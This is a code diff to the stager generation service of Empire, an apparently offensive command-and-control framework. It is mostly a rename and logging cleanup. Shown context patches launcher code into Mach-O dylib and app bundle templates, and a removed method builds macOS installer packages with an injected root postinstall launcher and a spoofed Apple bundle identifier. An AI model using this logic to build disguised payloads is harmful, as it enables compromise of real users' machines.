@@ -4,9 +4,7 @@ import logging
 import os
 import shutil
 import string
-import subprocess
 import typing
-import zipfile
 from itertools import cycle
 
 try:
@@ -20,7 +18,6 @@ from empire.server.common import helpers
 from empire.server.core.db import models
 from empire.server.core.db.base import SessionLocal
 from empire.server.utils import data_util
-from empire.server.utils.math_util import old_div
 
 if typing.TYPE_CHECKING:
     from empire.server.common.empire import MainMenu
@@ -334,13 +331,13 @@ class StagerGenerationService:
         MH_DYLIB = 6
         if hijacker.lower() == "true":
             if arch == "x86":
-                f = f"{self.mainMenu.installPath}/data/misc/hijackers/template.dylib"
+                f = f"{self.main_menu.installPath}/data/misc/hijackers/template.dylib"
             else:
-                f = f"{self.mainMenu.installPath}/data/misc/hijackers/template64.dylib"
+                f = f"{self.main_menu.installPath}/data/misc/hijackers/template64.dylib"
         elif arch == "x86":
-            f = f"{self.mainMenu.installPath}/data/misc/templateLauncher.dylib"
+            f = f"{self.main_menu.installPath}/data/misc/templateLauncher.dylib"
         else:
-            f = f"{self.mainMenu.installPath}/data/misc/templateLauncher64.dylib"
+            f = f"{self.main_menu.installPath}/data/misc/templateLauncher64.dylib"
 
         with open(f, "rb") as f:
             macho = macholib.MachO.MachO(f.name)
@@ -350,6 +347,9 @@ class StagerGenerationService:
                 return ""
 
             cmds = macho.headers[0].commands
+
+            placeHolderSz = None
+            offset = None
 
             for cmd in cmds:
                 count = 0
@@ -364,12 +364,18 @@ class StagerGenerationService:
                     ):
                         count += 1
                         for section in cmd[count]:
+                            log.debug(
+                                f"Checking section: {section.sectname.strip(b'\\x00')}"
+                            )
                             if section.sectname.strip(b"\x00") == b"__cstring":
                                 offset = int(section.offset)
                                 placeHolderSz = int(section.size) - 52
+                                log.debug(
+                                    f"Found offset: {offset}, placeHolderSz: {placeHolderSz}"
+                                )
             template = f.read()
 
-        if placeHolderSz and offset:
+        if placeHolderSz is not None and offset is not None:
             launcher = launcher_code + "\x00" * (placeHolderSz - len(launcher_code))
             if isinstance(launcher, str):
                 launcher = launcher.encode("UTF-8")
@@ -439,7 +445,7 @@ class StagerGenerationService:
             launcher = launcher_code.encode("utf-8") + b"\x00" * (
                 placeHolderSz - len(launcher_code)
             )
-            patchedBinary = (
+            patched_binary = (
                 template[:offset] + launcher + template[(offset + len(launcher)) :]
             )
             if app_name == "":
@@ -449,7 +455,7 @@ class StagerGenerationService:
             shutil.copytree(directory, tmpdir)
             with open(tmpdir + "Contents/MacOS/launcher", "wb") as f:
                 if disarm is not True:
-                    f.write(patchedBinary)
+                    f.write(patched_binary)
                 else:
                     t = (
                         self.main_menu.installPath
@@ -542,80 +548,6 @@ class StagerGenerationService:
 
         log.error("Unable to patch application")
         return None
-
-    def generate_pkg(self, launcher, bundle_zip, app_name):
-        # unzip application bundle zip. Copy everything for the installer pkg to a temporary location
-        os.chdir("/tmp/")
-        with open("app.zip", "wb") as f:
-            f.write(bundle_zip)
-        zipf = zipfile.ZipFile("app.zip", "r")
-        zipf.extractall()
-        zipf.close()
-        os.remove("app.zip")
-
-        os.system("cp -r " + self.main_menu.installPath + "/data/misc/pkgbuild/ /tmp/")
-        os.chdir("pkgbuild")
-        os.system("cp -r ../" + app_name + ".app root/Applications/")
-        os.system("chmod +x root/Applications/")
-        subprocess.call(
-            "( cd root && find . | cpio -o --format odc --owner 0:80 | gzip -c ) > expand/Payload",
-            shell=True,
-            stderr=subprocess.DEVNULL,
-        )
-
-        os.system("chmod +x expand/Payload")
-        with open("scripts/postinstall", "r+") as s:
-            script = s.read()
-            script = script.replace("LAUNCHER", launcher)
-            s.seek(0)
-            s.write(script)
-        subprocess.call(
-            "( cd scripts && find . | cpio -o --format odc --owner 0:80 | gzip -c ) > expand/Scripts",
-            shell=True,
-            stderr=subprocess.DEVNULL,
-        )
-        os.system("chmod +x expand/Scripts")
-        numFiles = subprocess.check_output("find root | wc -l", shell=True).strip(b"\n")
-        size = subprocess.check_output("du -b -s root", shell=True).split(b"\t")[0]
-        size = old_div(int(size), 1024)
-        with open("expand/PackageInfo", "w+") as p:
-            pkginfo = """<?xml version="1.0" encoding="utf-8" standalone="no"?>
-    <pkg-info overwrite-permissions="true" relocatable="false" identifier="com.apple.APPNAME" postinstall-action="none" version="1.0" format-version="2" generator-version="InstallCmds-554 (15G31)" install-location="/" auth="root">
-        <payload numberOfFiles="KEY1" installKBytes="KEY2"/>
-        <bundle path="./APPNAME.app" id="com.apple.APPNAME" CFBundleShortVersionString="1.0" CFBundleVersion="1"/>
-        <bundle-version>
-            <bundle id="com.apple.APPNAME"/>
-        </bundle-version>
-        <upgrade-bundle>
-            <bundle id="com.apple.APPNAME"/>
-        </upgrade-bundle>
-        <update-bundle/>
-        <atomic-update-bundle/>
-        <strict-identifier>
-            <bundle id="com.apple.APPNAME"/>
-        </strict-identifier>
-        <relocate>
-            <bundle id="com.apple.APPNAME"/>
-        </relocate>
-        <scripts>
-            <postinstall file="./postinstall"/>
-        </scripts>
-    </pkg-info>
-    """
-            pkginfo = pkginfo.replace("APPNAME", app_name)
-            pkginfo = pkginfo.replace("KEY1", numFiles.decode("UTF-8"))
-            pkginfo = pkginfo.replace("KEY2", str(size))
-            p.write(pkginfo)
-        os.system("mkbom -u 0 -g 80 root expand/Bom")
-        os.system("chmod +x expand/Bom")
-        os.system("chmod -R 755 expand/")
-        os.system('( cd expand && xar --compression none -cf "../launcher.pkg" * )')
-        with open("launcher.pkg", "rb") as f:
-            package = f.read()
-        os.chdir("/tmp/")
-        shutil.rmtree("pkgbuild")
-        shutil.rmtree(app_name + ".app")
-        return package
 
     def generate_jar(self, launcher_code):
         with open(self.main_menu.installPath + "/data/misc/Run.java") as f:
